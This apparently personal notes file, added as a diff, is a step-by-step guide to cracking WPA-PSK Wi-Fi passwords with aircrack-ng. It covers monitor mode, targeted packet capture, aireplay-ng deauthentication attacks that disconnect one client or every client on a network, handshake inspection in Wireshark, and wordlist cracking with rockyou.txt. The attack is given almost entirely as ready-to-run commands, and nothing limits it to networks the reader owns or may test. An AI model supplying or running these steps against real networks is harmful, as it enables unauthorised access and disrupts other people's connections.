@@ -1,0 +1,115 @@
+-NB:: NETWORK MUST BE USING WPA PSK ENCRYPTION.
+-Word list attack is just a bunch of words that will be encrypted and compared to the encryption of the wifi password.
+-For this to work you wifi card must support monitor mode else you have to get an adapter.
+			
+
+					STEPS (MUST BE RUN IN ROOT)
+					===============================
+-Get the name of you wireless network interface.
+	EG.
+		ip a
+			OR
+		sudo ifconfig
+			OR
+		airmon-ng
+				== in my case its wlp2s0
+
+
+-Lets check if the airmon-ng is installed.
+	EG.
+		airmon-ng
+			OR
+		sudo airmon-ng
+
+    -If there is a problem then just install:
+		EG.
+			sudo apt install aircrack-ng
+
+
+-Turn on monitor mode on the wifi or device so that you can see the networks that are around you.
+	use => airmon-ng start <wifi interface>
+	EG.
+		airmon-ng start wlp2s0.
+
+	-When command is executed the network interface name adds mon:
+		EG.
+			wlp2s0 -> wlp2s0mon
+
+	-the internet will break as soon as the monitor mode is turned on.
+
+
+-Now you can check if the card has been changed to the monitor state by typing :
+	EG.
+		iwconfig.
+	
+	-if nothing about monitoring is written in the mode, then the wifi card doesn't support monitor mode.
+
+
+-Now you can start listenning to all the networks that are around you using:
+	-airodump-ng followed by the wireless network interface 
+		EG.
+			airodump-ng wlp2s0mon -> we are using wlp2s0mon since the card's name has changed from wlp2s0.
+
+		-here we are concerned about the channel (ch) of the network and the BSSID. 
+
+
+-Now with the channel number and the BSSID we are going to:
+	-Use airodump-ng followed by the BSSID value, file that is going to be exported and channel number and network interface.
+		EG.
+			airodump-ng -d 04:95:E6:F6:3B:80 -w file_toStore -c 5 wlp2s0mon
+
+				-d :- it allows us to specify the router/network basic service set Indentifyer (bssid).
+				-w :- will write the data gotten from the program to a specific file.
+				-c :- specifyies the starting channel but the program will hope from one channel to the other to get a better aspect.
+		
+		-this will show you all the devices that are currently connected to that network.
+
+
+-Now we need a device to connect to the network so that in the handshake we can get the incrypted password.To do this we use DEAUTHENTICATION(-0) ATTACK to force it to reconnect so that we can campture the handshake. DON'T CLOSE THE WINDOW WITH THE SIXTH PROCESS RUNNING.
+		-we use the aireplay-ng followed by the -0, followed by the number of deauthentication packets (10 in my case.), -a followed by the BSSID or router -c followed by the victims BSSID then network interface.
+		 EG.
+		 	aireplay-ng -0 10 -a 04:95:E6:F6:3B:80 -c F2:84:64:39:84:24 wlp2s0mon -> will remove the specified device mac address and send 10 deauthentication 
+		 																			 packets.
+		 		OR
+		 	aireplay-ng --deauth 0 -a 04:95:E6:F6:3B:80 wlp2s0mon -> will remove all the devices on the network and send unlimited deauthentication packets.
+		 														  -> this can be used to remove all devices on your network.
+
+		 		-0 :- allows us to specify the number of deauthentication packets that are going to be sent which in our case is 10.
+		 		-a :- the address of the router/network.
+		 		--deauth :- this allows us to send unlimited number of deauthentication packets.
+		 		-c :- specifyes the device that will be removed or affected by the deauthenticaton packets.
+		 	
+		-For more efficienty you should use the --deauth 0 instead of specifying the number of packets to be sent.
+		-When the handshake has been gotten when we go back to the sixth step, we will see on the first line :
+			-wps handshake followed by the device mac address of the device that allowed us to get the handshake.
+				EG.
+					WPA handshake: 04:95:E6:F6:3B:80
+
+		- also we can view the filename.cap where filename refers to the file name you gave the 6th step using wireshark and look for the eapol.
+			EG.
+				- if you used filename of opens
+					wireshark ./opens.cap -> filter the data in wireshark using eapol to see the handshake that occured.
+
+
+-Now you can use the wordlist that is installed to cross check their incryption with the incryption of the handshake:
+
+		-All wordlists are found in this location:
+			/usr/share/wordlist/
+		-but if unsure then search wordlist in the search bar.
+
+		-we use aircrack-ng followed by the path to the wordlist then the name of the capture file (file.cap)
+			EG.
+				aircrack-ng -w /usr/share/wordlist/rockyou.txt filename.cap
+
+
+-When done you can just close both the airmon/monitor mode and restart or the net* services:
+	EG.
+		airmon-ng stop wlp2s0mon
+			AND 
+		sudo ifconfig wlp2s0 up -> the wlp2s0 is the network interface that we placed into monitor mode.
+								-> when the network interface is down then you can't access the web.
+								-> can be undone by restarting the pc or using this command.
+			AND
+		sudo systemctl restart NetworkManager
+			OR
+		sudo service NetworkManager restart
